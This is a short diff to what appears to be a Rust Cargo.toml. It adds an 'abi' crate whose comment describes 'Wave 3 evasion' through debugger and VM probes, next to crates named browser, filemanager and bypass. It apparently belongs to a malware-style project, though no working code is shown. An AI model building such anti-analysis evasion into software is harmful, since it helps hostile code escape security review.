@@ -17,4 +17,6 @@ browser = { path = "../browser" }
 output = { path = "../output" }
 filemanager = { path = "../filemanager" }
 bypass = { path = "../bypass" }
+# Wave 3 evasion (debugger/VM probes) — unsafe+WinAPI lives only in abi.
+abi = { path = "../abi" }
 log = { workspace = true }
